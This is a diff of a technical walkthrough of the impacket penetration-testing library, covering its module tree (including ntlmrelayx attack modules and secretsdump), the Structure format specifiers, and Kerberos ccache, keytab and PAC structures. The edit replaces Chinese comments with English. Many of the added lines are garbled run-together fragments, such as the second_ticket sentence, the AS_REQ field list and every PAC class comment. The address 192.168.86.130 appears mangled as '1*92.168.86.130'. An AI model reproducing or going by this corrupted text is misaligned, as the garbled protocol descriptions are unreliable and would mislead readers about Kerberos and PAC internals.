@@ -39,178 +39,34 @@ Within Part III, the dcerpc interface modules fall into five functional groups (
 
 ```
 C:.
-│   cdp.py
-│   crypto.py
-│   dhcp.py
-│   dns.py
-│   dot11.py
-│   Dot11Crypto.py
-│   Dot11KeyManager.py
-│   dpapi.py
-│   eap.py
-│   ese.py
-│   helper.py
-│   hresult_errors.py
-│   http.py
-│   ICMP6.py
-│   ImpactDecoder.py
-│   ImpactPacket.py
-│   IP6.py
-│   IP6_Address.py
-│   IP6_Extension_Headers.py
-│   mapi_constants.py
-│   mqtt.py
-│   NDP.py
-│   nmb.py
-│   ntlm.py
-│   nt_errors.py
-│   pcapfile.py
-│   pcap_linktypes.py
-│   smb.py
-│   smb3.py
-│   smb3structs.py
-│   smbconnection.py
-│   smbserver.py
-│   spnego.py
-│   structure.py
-│   system_errors.py
-│   tds.py
-│   uuid.py
-│   version.py
-│   winregistry.py
-│   wps.py
-│   __init__.py
+│   # impacket root: protocol implementations and base modules
+│   cdp.py / crypto.py / dhcp.py / dns.py / dot11.py / Dot11Crypto.py
+│   dpapi.py / ese.py / http.py / nmb.py / ntlm.py / spnego.py
+│   smb.py / smb3.py / smb3structs.py / smbconnection.py / smbserver.py
+│   structure.py / system_errors.py / tds.py / uuid.py / version.py / wps.py ...
 │
 ├───dcerpc
-│   │   __init__.py
-│   │
-│   └───v5
-│       │   atsvc.py
-│       │   bkrp.py
-│       │   dcomrt.py
-│       │   dhcpm.py
-│       │   drsuapi.py
-│       │   dssp.py
-│       │   dtypes.py
-│       │   enum.py
-│       │   epm.py
-│       │   even.py
-│       │   even6.py
-│       │   iphlp.py
-│       │   lsad.py
-│       │   lsat.py
-│       │   mgmt.py
-│       │   mimilib.py
-│       │   ndr.py
-│       │   nrpc.py
-│       │   nspi.py
-│       │   oxabref.py
-│       │   par.py
-│       │   rpch.py
-│       │   rpcrt.py
-│       │   rprn.py
-│       │   rrp.py
-│       │   samr.py
-│       │   sasec.py
-│       │   scmr.py
-│       │   srvs.py
-│       │   transport.py
-│       │   tsch.py
-│       │   tsts.py
-│       │   wkst.py
-│       │   __init__.py
+│   └───v5                # py implementations of each RPC interface (Parts III & VI)
+│       │   ndr.py / rpcrt.py / dtypes.py / enum.py / transport.py / epm.py   # RPC foundations
+│       │   atsvc.py / bkrp.py / dhcpm.py / drsuapi.py / dssp.py / even6.py
+│       │   lsad.py / lsat.py / mimilib.py / nrpc.py / nspi.py / oxabref.py
+│       │   par.py / rpch.py / rprn.py / rrp.py / samr.py / srvs.py
+│       │   tsch.py / tsts.py / wkst.py / dcomrt.py ...
 │       │
-│       └───dcom
-│               comev.py
-│               oaut.py
-│               scmp.py
-│               vds.py
-│               wmi.py
-│               __init__.py
+│       └───dcom          # DCOM submodules (Part VI)
+│               comev.py / oaut.py / scmp.py / vds.py / wmi.py
 │
-├───examples
-│   │   ldap_shell.py
-│   │   logger.py
-│   │   os_ident.py
-│   │   remcomsvc.py
-│   │   rpcdatabase.py
-│   │   secretsdump.py
-│   │   serviceinstall.py
-│   │   smbclient.py
-│   │   utils.py
-│   │   __init__.py
-│   │
-│   └───ntlmrelayx
-│       │   __init__.py
-│       │
-│       ├───attacks
-│       │   │   dcsyncattack.py
-│       │   │   httpattack.py
-│       │   │   imapattack.py
-│       │   │   ldapattack.py
-│       │   │   mssqlattack.py
-│       │   │   rpcattack.py
-│       │   │   smbattack.py
-│       │   │   __init__.py
-│       │   │
-│       │   └───httpattacks
-│       │           adcsattack.py
-│       │           __init__.py
-│       │
-│       ├───clients
-│       │       dcsyncclient.py
-│       │       httprelayclient.py
-│       │       imaprelayclient.py
-│       │       ldaprelayclient.py
-│       │       mssqlrelayclient.py
-│       │       rpcrelayclient.py
-│       │       smbrelayclient.py
-│       │       smtprelayclient.py
-│       │       __init__.py
-│       │
-│       ├───servers
-│       │   │   httprelayserver.py
-│       │   │   rawrelayserver.py
-│       │   │   smbrelayserver.py
-│       │   │   socksserver.py
-│       │   │   wcfrelayserver.py
-│       │   │   __init__.py
-│       │   │
-│       │   └───socksplugins
-│       │           http.py
-│       │           https.py
-│       │           imap.py
-│       │           imaps.py
-│       │           mssql.py
-│       │           smb.py
-│       │           smtp.py
-│       │           __init__.py
-│       │
-│       └───utils
-│               config.py
-│               enum.py
-│               ssl.py
-│               targetsutils.py
-│               tcpshell.py
-│               __init__.py
+├───examples              # common domain-pentest scripts: getTGT / getST / ticketer / secretsdump
+│   │                     # psexec / wmiexec / atexec / dcomexec / rpcmap / netview ...
+│   └───ntlmrelayx        # NTLM relay framework (attacks / clients / servers /
+│                         #   socksplugins / utils subtrees omitted)
 │
-├───krb5
-│       asn1.py
-│       ccache.py
-│       constants.py
-│       crypto.py
-│       gssapi.py
-│       kerberosv5.py
-│       keytab.py
-│       pac.py
-│       types.py
-│       __init__.py
+├───krb5                  # Kerberos implementation (Part IV)
+│       asn1.py / ccache.py / constants.py / crypto.py / gssapi.py
+│       kerberosv5.py / keytab.py / pac.py / types.py
 │
-└───ldap
-        ldap.py
-        ldapasn1.py
-        ldaptypes.py
-        __init__.py
+└───ldap                  # LDAP implementation
+        ldap.py / ldapasn1.py / ldaptypes.py
 ```
 Next we walk through the key functions and methods of each module.
 
@@ -226,58 +82,17 @@ The root-level structure.py defines the Structure base class — every class in 
         where format specifies how the data in the field will be converted to/from bytes (string)
         class is the class to use when unpacking ':' fields.
 
-        each field can only contain one value (or an array of values for *)
-           i.e. struct.pack('Hl',1,2) is valid, but format specifier 'Hl' is not (you must use 2 dfferent fields)
-
-        format specifiers:
-          specifiers from module pack can be used with the same format 
-          see struct.__doc__ (pack/unpack is finally called)
-            x       [padding byte]
-            c       [character]
-            b       [signed byte]
-            B       [unsigned byte]
-            h       [signed short]
-            H       [unsigned short]
-            l       [signed long]
-            L       [unsigned long]
-            i       [signed integer]
-            I       [unsigned integer]
-            q       [signed long long (quad)]
-            Q       [unsigned long long (quad)]
-            s       [string (array of chars), must be preceded with length in format specifier, padded with zeros]
-            p       [pascal string (includes byte count), must be preceded with length in format specifier, padded with zeros]
-            f       [float]
-            d       [double]
-            =       [native byte ordering, size and alignment]
-            @       [native byte ordering, standard size and alignment]
-            !       [network byte ordering]
-            <       [little endian]
-            >       [big endian]
-
-          usual printf like specifiers can be used (if started with %) 
-          [not recommended, there is no way to unpack this]
-
-            %08x    will output an 8 bytes hex
-            %s      will output a string
-            %s\\x00  will output a NUL terminated string
-            %d%d    will output 2 decimal digits (against the very same specification of Structure)
-            ...
-
+        format specifiers:  # identical to the struct module (x c b B h H l L i I q Q s p f d = @ ! < >)
           some additional format specifiers:
             :       just copy the bytes from the field into the output string (input may be string, other structure, or anything responding to __str__()) (for unpacking, all what's left is returned)
-            z       same as :, but adds a NUL byte at the end (asciiz) (for unpacking the first NUL byte is used as terminator)  [asciiz string]
-            u       same as z, but adds two NUL bytes at the end (after padding to an even size with NULs). (same for unpacking) [unicode string]
+            z       same as :, but adds a NUL byte at the end (asciiz)  [asciiz string]
+            u       same as z, but adds two NUL bytes at the end  [unicode string]
             w       DCE-RPC/NDR string (it's a macro for [  '<L=(len(field)+1)/2','"\\x00\\x00\\x00\\x00','<L=(len(field)+1)/2',':' ]
-            ?-field length of field named 'field', formatted as specified with ? ('?' may be '!H' for example). The input value overrides the real length
-            ?1*?2   array of elements. Each formatted as '?2', the number of elements in the array is stored as specified by '?1' (?1 is optional, or can also be a constant (number), for unpacking)
-            'xxxx   literal xxxx (field's value doesn't change the output. quotes must not be closed or escaped)
-            "xxxx   literal xxxx (field's value doesn't change the output. quotes must not be closed or escaped)
-            _       will not pack the field. Accepts a third argument, which is an unpack code. See _Test_UnpackCode for an example
-            ?=packcode  will evaluate packcode in the context of the structure, and pack the result as specified with ?. Unpacking is made plain
-            ?&fieldname "Address of field fieldname".
-                        For packing it will simply pack the id() of fieldname. Or use 0 if fieldname doesn't exists.
-                        For unpacking, it's used to know weather fieldname has to be unpacked or not, i.e. by adding a & field you turn another field (fieldname) in an optional field.
-            
+            ?-field length of field named 'field', formatted as specified with ?
+            ?1*?2   array of elements. Each formatted as '?2', the number of elements is stored as specified by '?1'
+            'xxxx / "xxxx   literal xxxx (field's value doesn't change the output)
+            # printf-style (%08x, %s, ...) and the rarer _ / ?=packcode / ?&fieldname
+            # specifiers are omitted here — see the structure.py source for the full description
     """
 ```
 
@@ -322,7 +137,7 @@ class Header(Structure):
 
 
 
-### ldap.py
+### ldap.py — LDAP Login & Search (login / search)
 This file implements the login functions for LDAP, LDAPS, GC (Global Catalog) and Kerberos.
 
 ```python
@@ -345,7 +160,7 @@ These 3 functions of ldap.py are the ones you will use most when writing scripts
 
 A quick note on GC: the Global Catalog can loosely be understood as a cross-domain cached-database interface. A global catalog server holds a set of all objects in the Active Directory Domain Services (AD DS) forest — it is a domain controller that stores a full replica of every object in its own domain's directory plus a partial, read-only replica of the objects of every other domain in the forest, and answers global-catalog queries. Its ports are 3268 (LDAP) and 3269 (LDAPS) — two more ports worth adding to your DC scan list.
 
-### ldapasn1.py
+### ldapasn1.py — LDAP Request Data Structures (ASN.1)
 
 This file defines the data structures of each LDAP request parameter; think of them as the structs of Go.
 
@@ -409,7 +224,7 @@ class Record(Sequence):
     )
 ```
 
-### ldaptypes.py
+### ldaptypes.py — ACL Security Descriptor Structures (ACE / DACL)
 
 This file mainly defines the security-descriptor structures used in ACLs (ACE, DACL, etc.).
 
@@ -452,7 +267,7 @@ In practice it is mainly used to construct ACL-modification requests.
 
 ## Chapter 4 Kerberos Authentication (krb5)
 
-### asn1.py
+### asn1.py — Kerberos Packet Formats (AS/TGS/AP)
 
 asn1.py defines the packet formats of the Kerberos request / response types, such as AS_REQ, AS_REP, TGS_REQ and TGS_REP.
 
@@ -525,7 +340,7 @@ For concrete usage, look at the Kerberos-related scripts under examples (getST, 
         ......
 ```
 
-### constants.py
+### constants.py — Kerberos Enum Constants (flags / error_code)
 
 Holds the static enumerations used during Kerberos authentication — flags, error codes, principal types and so on — convenient to reference while authenticating.
 
@@ -559,36 +374,36 @@ class PrincipalNameType(Enum):
     NT_ENT_PRINCIPAL_AND_ID = -130
 ```
 
-### keytab.py
+### keytab.py — Key Table File Parsing & Saving
 
 As the name suggests, this file contains the classes and functions for parsing and saving keytab files. A keytab is a key table holding the keys of Principals; it plays roughly the same role as the id_rsa private key in SSH authentication, allowing passwordless Kerberos verification. It usually lives under /etc/security/keytabs/ (e.g. nn.service.keytab). Take generating and using a keytab on CDH as an example:
 
 ```shell
- 1、进入到kerberos
+ 1. Enter kerberos admin
 
   kadmin.local
 
-2、查看kerberos成员
+2. List kerberos principals
 
 listprincs
 
-3、添加kerberos成员
+3. Add kerberos principal
 
 kadmin -p 'kdcadmin/admin' -w "-s" -q 'addprinc -randkey hive'
 
-4、生成keytab文件
+4. Generate keytab file
 
 ktadd -k   /home/kerberos/hive.keytab -norandkey hive@TEST.COM
 
-5、使用生成的keytab文件认证用户
+5. Authenticate with the generated keytab
 
 kinit -kt  /home/kerberos/hive.keytab hive/bdp4@TEST.COM
 
-6、查看当前认证用户
+6. Show current authenticated user
 
 klist
 
-7、使用beeline远程访问
+7. Remote access via beeline
 
 beeline -u "jdbc:hive2://1*92.168.86.130:10000/default;principal=hive/bdp4@TEST.COM"
 ```
@@ -604,11 +419,11 @@ The keytab file format is as follows:
   keytab_entry {
       int32_t size;
       uint16_t num_components;    /* sub 1 if version 0x501 */
-      counted_octet_string realm; 域名
-      counted_octet_string components[num_components]; 主体名称
-      uint32_t name_type;   /* not present if version 0x501 */ 主体类型
-      uint32_t timestamp; 时间戳
-      uint8_t vno8; 密钥版本号
+      counted_octet_string realm; realm
+      counted_octet_string components[num_components]; principal name
+      uint32_t name_type;   /* not present if version 0x501 */ principal type
+      uint32_t timestamp; timestamp
+      uint8_t vno8; key version
       keyblock key;
       uint32_t vno; /* only present if >= 4 bytes left in entry */
   };
@@ -619,87 +434,61 @@ The keytab file format is as follows:
   };
 
   keyblock {
-      uint16_t type; 加密类型
-      counted_octet_string;加密key
+      uint16_t type; encryption type
+      counted_octet_string;encryption key
   };
 
 ```
 
 The getData() and getKey() functions of the keytab class show how the keytab file structure is parsed and its values extracted.
 
-### ccache.py
+### ccache.py — Credential Cache Parsing (toTGT / toTGS)
 
 As seen in Chapter 2's structure.py, ccache.py parses the Kerberos credential-cache binary file (ccache); the Credential class provides toTGT, toTGS and friends. First look at the ccache file structure:
 
 ```text
 ccache {
-          uint16_t file_format_version; /* 0x0504 */ 文件格式版本
+          uint16_t file_format_version; /* 0x0504 */ file format version
           uint16_t headerlen;           /* only if version is 0x0504 */
-          header headers[];             /* only if version is 0x0504 */
+          header headers[];             /* present only in 0x0504 and above */
           principal primary_principal;
           credential credentials[*];
 };
 
-header {
-       uint16_t tag;                    /* 1 = DeltaTime */
-       uint16_t taglen;
-       uint8_t tagdata[taglen]
-};  // 仅存在于 0x0504 及以上版本
-其中最常用的tag为DeltaTime（(0x0001)），tagdata中是time_offset和usec_offset
-DeltaTime {
-       uint32_t time_offset;
-       uint32_t usec_offset;
-};
+# the header structure is "tag + taglen + tagdata"; the most common tag is DeltaTime (0x0001),
+# whose tagdata holds time_offset / usec_offset — the skew between local clock and KDC
+
 credential {
-           principal client; 客户端数据块
-           principal server; 服务端数据块
-           keyblock key; 密钥块
-           times    time; 时间模块
-           uint8_t  is_skey;   是否是skey         /* 1 if skey, 0 otherwise */
-           uint32_t tktflags;           /* stored in reversed byte order */
-           uint32_t num_address;
-           address  addrs[num_address]; 地址模块
-           uint32_t num_authdata; 
-           authdata authdata[num_authdata]; 授权数据
-            counted_octet_string ticket; 票据
-            counted_octet_string second_ticket; 第二张票据，通过 DUPLICATE-SKEY 或 ENC-TKT-IN-SKEY 与票据相关
+            principal client; client block
+            principal server; server block
+            keyblock key; key block
+            times    time; time block (authtime / starttime / endtime / renew_till)
+            uint8_t  is_skey;   whether skey    /* 1 if skey, 0 otherwise */
+            uint32_t tktflags;           /* stored in reversed byte order */
+            uint32_t num_address;
+            address  addrs[num_address]; address block
+            uint32_t num_authdata; 
+            authdata authdata[num_authdata]; authorization data
+            counted_octet_string ticket; the ticket
+            counted_octet_string second_ticket; second ticket, related via DUPLICATE-SKEY or ENC-TKT-IN-SKEY
 };
 
 keyblock {
-         uint16_t keytype;加密类型
-         uint16_t etype;                /* only present if version 0x0503 */
-         uint16_t keylen;
-         uint8_t keyvalue[keylen]; 密钥key
-};
-
-times {
-      uint32_t  authtime;
-      uint32_t  starttime;
-      uint32_t  endtime;
-      uint32_t  renew_till;
-};
-
-address {
-        uint16_t addrtype;
-        counted_octet_string addrdata;
-};
-
-authdata {
-         uint16_t authtype;
-         counted_octet_string authdata;
+          uint16_t keytype; encryption type
+          uint16_t etype;                /* only present if version 0x0503 */
+          uint16_t keylen;
+          uint8_t keyvalue[keylen]; the key
 };
 
 principal {
-          uint32_t name_type;           /* not present if version 0x0501 */
-          uint32_t num_components;      /* sub 1 if version 0x501 */
-          counted_octet_string realm; 域
-          counted_octet_string components[num_components]; 用户/服务名称
+           uint32_t name_type;           /* not present if version 0x0501 */
+           uint32_t num_components;      /* sub 1 if version 0x501 */
+           counted_octet_string realm; realm
+           counted_octet_string components[num_components]; user/service name
 };
 
-counted_octet_string {
-    uint32_t length;
-    uint8_t data[length];
-};
+# times / address / authdata / counted_octet_string sub-structures omitted:
+# all follow the two-part "type field + counted_octet_string (length + data)" layout
 ```
 
 The existence of the second ticket is puzzling at first sight; after digging through many docs, its use case turned up in IBM's system-programming documentation:
@@ -724,7 +513,7 @@ ccache
 Specifies the credentials cache. The initial TGT for the local realm must already be in the cache. The Kerberos runtime obtains additional ticket-granting tickets as needed if the target server is not in the local realm.
 in_cred
 Specifies the request credentials. The client and server fields must be set to the desired values for the service ticket. The second_ticket field must be set if the service ticket is to be encrypted in a session key. The ticket expiration time can be set to override the default expiration time.
-如果要在会话密钥中加密服务票证，则必须设置second_ticket字段。
+ifinsessionthenmustsetssecond_ticket
 Output
 out_cred
 Returns the service ticket. The krb5_free_creds() routine should be called to release the credentials when they are no longer needed.
@@ -768,7 +557,7 @@ as in the following example:
         ccache.saveFile(self.__user + '.ccache')
 ```
 
-### types.py
+### types.py — Principal & Other Auth Data Handlers
 
 Mostly the handler classes for data used throughout Kerberos authentication: KerberosException, Principal, Address, EncryptedData, Ticket, KerberosTime. The most important one is Principal (the authentication principal). It consists of three parts — primary (user / service name), instance (service instance name) and realm (domain name). primary and instance are separated by /, instance and realm by @, as in joe/admin@EXAMPLE.COM or joe/node2.example.com.
 
@@ -784,25 +573,10 @@ class Principal(object):
 
 If the value contains no realm, then default_realm will be used."""
     def __init__(self, value=None, default_realm=None, type=None):
-        self.type = constants.PrincipalNameType.NT_UNKNOWN
-        self.components = []
-        self.realm = None
+        ......
 
-        if value is None:
-            return
-
-        try:               # Python 2
-            if isinstance(value, unicode):
-                value = value.encode('utf-8')
-        except NameError:  # Python 3
-            if isinstance(value, bytes):
-                value = value.decode('utf-8')
-
-        if isinstance(value, Principal):
-            self.type = value.type
-            self.components = value.components[:]
-            self.realm = value.realm
         elif isinstance(value, str):
+            # string form: the regex splits out the realm (after @) and the components (slash-separated, \ escaping supported)
             m = re.match(r'((?:[^\\]|\\.)+?)(@((?:[^\\@]|\\.)+))?$', value)
             if not m:
                 raise KerberosException("invalid principal syntax")
@@ -819,59 +593,11 @@ If the value contains no realm, then default_realm will be used."""
                 unquote_component(qc)
                 for qc in re.findall(r'(?:[^\\/]|\\.)+', m.group(1))]
         elif len(value) == 2:
-            self.components = value[0]
-            self.realm = value[-1]
-            if isinstance(self.components, str):
-                self.components = [self.components]
-        elif len(value) >= 2:
-            self.components = value[0:-1]
-            self.realm = value[-1]
-        else:
-            raise KerberosException("invalid principal value")
+            ......
 
-        if type is not None:
-            self.type = type
-
-    def __eq__(self, other):
-        if isinstance (other, str):
-            other = Principal (other)
-
-        return (self.type == constants.PrincipalNameType.NT_UNKNOWN.value or
-                other.type == constants.PrincipalNameType.NT_UNKNOWN.value or
-                self.type == other.type) and all (map (lambda a, b: a == b, self.components, other.components)) and \
-               self.realm == other.realm
-
-    def __str__(self):
-        def quote_component(comp):
-            return re.sub(r'([\\/@])', r'\\\1', comp)
-
-        ret = "/".join([quote_component(c) for c in self.components])
-        if self.realm is not None:
-            ret += "@" + self.realm
-
-        return ret
-
-    def __repr__(self):
-        return "Principal((" + repr(self.components) + ", " + \
-               repr(self.realm) + "), t=" + str(self.type) + ")"
-
-    def from_asn1(self, data, realm_component, name_component):
-        name = data.getComponentByName(name_component)
-        self.type = constants.PrincipalNameType(
-            name.getComponentByName('name-type')).value
-        self.components = [
-            str(c) for c in name.getComponentByName('name-string')]
-        self.realm = str(data.getComponentByName(realm_component))
-        return self
-
-    def components_to_asn1(self, name):
-        name.setComponentByName('name-type', int(self.type))
-        strings = name.setComponentByName('name-string'
-                                          ).getComponentByName('name-string')
-        for i, c in enumerate(self.components):
-            strings.setComponentByPosition(i, c)
-
-        return name
+    # __eq__ / __str__ / __repr__ and friends omitted.
+    # from_asn1 and components_to_asn1 convert Principal to/from asn1 structures
+    # and are used heavily in getKerberosTGT / getKerberosTGS (see the kerberosv5.py section)
 ```
 
 In getST we can see how a Principal is assigned:
@@ -880,7 +606,7 @@ In getST we can see how a Principal is assigned:
 principal = ccache.credentials[0].header['server'].prettyPrint()
 ```
 
-### crypto.py
+### crypto.py — Kerberos Enctype Implementations (RC4 / AES)
 
 Implements encryption / decryption and key derivation (string_to_key) for the Kerberos enctypes (RC4-HMAC, AES128/256-CTS-HMAC-SHA1, etc.); MD4 / MD5 support the RC4 family.
 
@@ -904,7 +630,7 @@ from impacket import nmb, ntlm, uuid, crypto
                 signature = crypto.AES_CMAC(self._Session['SigningKey'], p, len(p))
 ```
 
-### gssapi.py
+### gssapi.py — GSS-API Wrapper (MIC / WRAP)
 
 GSS-API is the industry-standard security API defined in RFC 2743, commonly used for Kerberos authentication of services such as MongoDB, PostgreSQL and FTP. It helps to distinguish GSS-API from the Kerberos protocol itself: GSS-API stands for [Generic Security Services Application Program Interface](https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface) — an API specification, i.e. the programming interface defined when implementing the Kerberos protocol.
 
@@ -1068,7 +794,7 @@ from impacket.spnego import SPNEGO_NegTokenResp
             return None, STATUS_ACCESS_DENIED
 ```
 
-### kerberosv5.py
+### kerberosv5.py — getKerberosTGT / getKerberosTGS Auth Flow
 
 The most important functions in this file are getKerberosTGT and getKerberosTGS — the heart of the Kerberos authentication flow.
 
@@ -1204,27 +930,27 @@ Now let's see what the AS_REQ header and req-body actually contain:
 ![AS_REQ field layout](https://img-blog.csdnimg.cn/4ea9b9b3bfea44d4ab77afbb01721929.png)
 
 ```
-1.pvno kerberos的版本号
-2.msg-type 消息类型，这里就是KRB_AS_REQ(0x0a)
-3.PA_DATA Pre-authentication Data，预身份认证，每个认证消息有type和value。
-PA-DATA PA-ENC-TIMESTAMP 用户HASH加密后的时间戳
-	padata-type: padata类型
-		padata-value: padata的值
-			etype:  加密类型
-			cipher: 加密后的值
-PA-DATA PA-PAC-REQUEST：PAC扩展
-	padata-type: padata类型
-		padata-value: padata的值
-		include-pac: 是否包含PAC，如果包含那么在响应包中就会返回PAC
-4.req-body 请求体
-padding:填充
-kdc-options:用于与KDC约定一些选项设置
-cname: 客户端用户名
-realm: 域名 
-sname: 服务端用户名，在AS_REQ 中sname是krbtgt，类型是KRB_NT_SRV_INST
-till: 到期时间，rubeus和kekeo都是20370913024805Z，可以作为特征检测
-nonce：随机生成的一个数，用于检测重放攻击
-etype: 协商加密类型，KDC按照etype类型选择用户hash对应的加密方式
+1.pvno Kerberos protocol version
+2.msg-type message typeKRB_AS_REQ(0x0a)
+3.PA_DATA Pre-authentication Data，pre-authentication data，each auth message has type and value。
+PA-DATA PA-ENC-TIMESTAMP userHASHtimestamp
+	padata-type: padata type
+		padata-value: padata value
+			etype:  encryption type
+			cipher: encrypted value
+PA-DATA PA-PAC-REQUEST：PAC extension
+	padata-type: padata type
+		padata-value: padata value
+		include-pac: whether to include PAC，if included, PAC is returned in the response
+4.req-body request body
+padding:padding
+kdc-options:KDC option settings
+cname: client username
+realm: realm 
+sname: server username，in AS_REQ sname is krbtgt，type is KRB_NT_SRV_INST
+till: expiry timerubeuskekeo20370913024805Zcan be used as detection signature
+nonce：randomly generated number，for replay detection
+etype: encryption typeKDC selects encryption per etype
 ```
 
 In the AS_REP reply you can see the TGT and the session key encrypted with the user key (enc-part).
@@ -1260,8 +986,8 @@ It builds a TGS_REQ from the supplied TGT and session key (the AP_REQ carries th
 Having received part 1 (the TGT) and part 2 (the session-key-encrypted Authenticator), the KDC first decrypts the TGT with the krbtgt key to recover the client identity and session key, then decrypts part 2 with that session key to recover the client identity inside the Authenticator; if the two match, authentication passes. The KDC then encrypts a fresh ticket with the key of the target service requested in part 1 and returns two things to the client:
 
 ```text
-内容 1：用目标服务密钥加密的服务票据（包含客户端 ID、客户端网络地址、有效期和客户端 / 服务端会话密钥）
-内容 2：用 TGS 会话密钥加密的客户端 / 服务端会话密钥
+ 1ticketcontainingclient IDclientclient / session
+ 2 TGS sessionclient / session
 ```
 
 The client decrypts part 2 with the TGS session key and obtains the new client/server session key:
@@ -1292,7 +1018,7 @@ The subsequent TGS parsing again happens in the getST script via ccache.py's fro
         ccache.saveFile(self.__saveFileName + '.ccache')
 ```
 
-### pac.py
+### pac.py — Privilege Attribute Certificate (PAC) Structures
 
 The Privilege Attribute Certificate (PAC) is carried by authentication protocols to convey authorization information and control access to resources. The Kerberos protocol [RFC4120] itself provides no authorization; the PAC was created precisely to supply that authorization data for the Kerberos protocol extensions [MS-KILE]. The PAC structure encodes the authorization information per [MS-KILE], including group membership, extra credential information, profile and policy data, and supporting security metadata.
 
@@ -1302,63 +1028,63 @@ The module mainly provides the PAC data structures, shown below:
 
 ```python
 class KERB_SID_AND_ATTRIBUTES(NDRSTRUCT):
-# 表示用于身份验证的SID及其 属性。它在KERB_VALIDATION_INFO结构中发送，用于包含有关 SID 引用的组的附加信息。
+# used forSIDand inKERB_VALIDATION_INFOused forcontaining SID groupinformation
     
 class KERB_SID_AND_ATTRIBUTES_ARRAY(NDRUniConformantArray):
 class PKERB_SID_AND_ATTRIBUTES_ARRAY(NDRPOINTER):
     
 class DOMAIN_GROUP_MEMBERSHIP(NDRSTRUCT):
-# 结构标识账户所属的域和组。它在PAC_DEVICE_INFO结构中发送。
+# domaingroupinPAC_DEVICE_INFO
     
 class DOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRUniConformantArray):
 class PDOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRPOINTER):
     
 class PACTYPE(Structure):
-# PACTYPE结构是 PAC 的最顶层结构，指定 PAC_INFO_BUFFER数组中的元素数 。PACTYPE结构用作完整 PAC 数据的标头。
+# PACTYPE PAC specified PAC_INFO_BUFFERgroup PACTYPE PAC
     
 class PAC_INFO_BUFFER(Structure):
-# 在PACTYPE结构之后是一个PAC_INFO_BUFFER结构数组，每个结构都定义了 PAC 缓冲区的类型和字节偏移量。PAC_INFO_BUFFER数组 没有定义的顺序。因此，PAC_INFO_BUFFER 缓冲区的顺序没有意义。但是，一旦密钥分发中心 (KDC) 和服务器签名生成，缓冲区的顺序不得更改，否则 PAC 内容的签名验证将失败。
+# inPACTYPEPAC_INFO_BUFFERgroup PAC PAC_INFO_BUFFERgroup thisPAC_INFO_BUFFER (KDC) servernotthen PAC
     
     
 class KERB_VALIDATION_INFO(NDRSTRUCT):
-# KERB_VALIDATION_INFO结构定义了 DC 提供的用户登录和授权信息。指向 KERB_VALIDATION_INFO结构的指针被序列化为一个字节数组，然后放置在最顶层PACTYPE 结构的Buffers数组之后，位于缓冲区中相应PAC_INFO_BUFFER 结构的Offset字段中指定的偏移量处。相应的PAC_INFO_BUFFER 结构的ulType字段设置为 0x00000001。
-# KERB_VALIDATION_INFO结构是 NETLOGON_VALIDATION_SAM_INFO4 结构的子集（出于历史原因及 Active Directory 生成此信息的方式）。NTLM 在服务器与域控制器交换时使用 NETLOGON_VALIDATION_SAM_INFO4 结构，因此 KERB_VALIDATION_INFO 也包括特定于 NTLM 的字段；两结构共有的字段以及特定于 NTLM 身份验证操作的字段，不用于 [MS-KILE] 验证。KERB_VALIDATION_INFO 结构由 RPC [MS-RPCE] 编组。
+# KERB_VALIDATION_INFO DC userinformation KERB_VALIDATION_INFOisasgroupinPACTYPE BuffersgroupPAC_INFO_BUFFER OffsetspecifiedPAC_INFO_BUFFER ulTypesetsas 0x00000001
+# KERB_VALIDATION_INFO NETLOGON_VALIDATION_SAM_INFO4 outputand Active Directory thisinformationNTLM inserverwithdomain NETLOGON_VALIDATION_SAM_INFO4 this KERB_VALIDATION_INFO including NTLM and NTLM notused for [MS-KILE] KERB_VALIDATION_INFO RPC [MS-RPCE] group
     
 class PKERB_VALIDATION_INFO(NDRPOINTER):
     
 class PAC_CREDENTIAL_INFO(Structure):
-# PAC_CREDENTIAL_INFO结构用作凭证信息的标头。PAC_CREDENTIAL_INFO标头指示用于加密其后数据的加密算法。后面的数据是加密的、IDL序列化的PAC_CREDENTIAL_DATA结构，其中包含用户的实际凭证。请注意，此结构不能被[MS-KILE] 协议以外的协议使用；加密方法依赖于 Kerberos AS-REQ。PAC_CREDENTIAL_INFO结构包含用户的加密凭证。使用的加密密钥是 AS 回复密钥。仅当使用 PKINIT时才包含 PAC 凭据缓冲区。因此，AS reply key 是基于PKINIT 推导出来的。
+# PAC_CREDENTIAL_INFOinformationPAC_CREDENTIAL_INFOused forIDLPAC_CREDENTIAL_DATAcontaininguserthisnotis[MS-KILE] method Kerberos AS-REQPAC_CREDENTIAL_INFOcontaininguser AS PKINITcontaining PAC thisAS reply key PKINIT output
     
 class SECPKG_SUPPLEMENTAL_CRED(NDRSTRUCT):
-# 定义了需要补充凭证的安全包的名称以及该包的凭证缓冲区。
+# nameandthe
 class SECPKG_SUPPLEMENTAL_CRED_ARRAY(NDRUniConformantArray):
     
 class PAC_CREDENTIAL_DATA(NDRSTRUCT):
-# 定义了一组提供给 Kerberos 客户端的特定于安全包的凭证。
+# group Kerberos client
     
 class NTLM_SUPPLEMENTAL_CREDENTIAL(NDRSTRUCT):
-# 用于对 NTLM 安全协议使用的凭据进行编码，特别是LAN Manager哈希(LM OWF)和NT哈希(NT OWF).PAC 结构规范中未解决生成以该结构编码的哈希值的问题。[MS-NLMP]中指定了有关如何创建哈希的详细信息。仅当使用 PKINIT [MS-PKCA] 对用户进行身份验证时，才会包含 PAC 缓冲区类型。NTLM_SUPPLEMENTAL_CREDENTIAL 结构由RPC [MS-RPCE]封送。
+# used for NTLM LAN Manager(LM OWF)NT(NT OWF).PAC the[MS-NLMP]specifiedinformation PKINIT [MS-PKCA] usercontaining PAC NTLM_SUPPLEMENTAL_CREDENTIAL RPC [MS-RPCE]
     
 class PAC_CLIENT_INFO(Structure):
-# 是PAC的可变长度缓冲区，其中包含客户端的名称和身份验证时间。它用于验证 PAC 是否对应于票据的客户端。PAC_CLIENT_INFO 结构直接放置在最顶层 PACTYPE 结构的 Buffers 数组之后，位于Buffers数组中相应PAC_INFO_BUFFER结构的Offset字段中 指定的偏移处。相应的PAC_INFO_BUFFER的ulType字段 设置为 0x0000000A。
+# PACcontainingclientnameused for PAC ticketclientPAC_CLIENT_INFO in PACTYPE Buffers groupBuffersgroupPAC_INFO_BUFFEROffset specifiedPAC_INFO_BUFFERulType setsas 0x0000000A
     
 class PAC_SIGNATURE_DATA(Structure):
